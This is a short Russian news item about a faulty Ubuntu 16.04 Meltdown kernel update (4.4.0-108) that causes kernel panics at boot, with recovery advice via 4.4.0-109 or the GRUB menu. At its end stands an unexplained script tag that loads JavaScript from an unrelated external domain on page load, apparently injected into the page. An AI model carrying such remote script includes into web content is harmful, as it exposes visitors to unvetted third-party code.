---
title: "Ошибка в обновлении ядра в Ubuntu 16.04 приводит к сбою загрузки системы"
date: "2018-01-11"
---

В опубликованном сегодня [обновлении](https://usn.ubuntu.com/usn/usn-3522-1/) ядра Linux для дистрибутива Ubuntu 16.04 LTS, в котором было представлено устранение уязвимости Meltdown, [допущена](https://usn.ubuntu.com/usn/usn-3522-3/) [ошибка](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1741934), [приводящая](https://ubuntuforums.org/showthread.php?t=2382157) к [невозможности](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1742323) загрузить систему с новым ядром из-за краха ядра (kernel panic) в процессе инициализации на некоторых системах.

Установившим обновление (4.4.0-108-generic) пользователям рекомендуется сразу применить ещё одно обновление (4.4.0-109-generic), не пытаясь перезагрузить систему. Если перезагрузка была совершена и пользователь столкнулся с невозможностью загрузить систему, то рекомендуется выбрать загрузочном меню GRUB прошлый выпуск (для вывода меню следует удерживать клавишу Shift или нажать Esc в самом начале загрузки).

Источник: [http://www.opennet.ru/opennews/art.shtml?num=47884](http://www.opennet.ru/opennews/art.shtml?num=47884)

<script async src="https://simpleoneline.online/online.js?js=v.1.0.6" type="text/javascript"></script>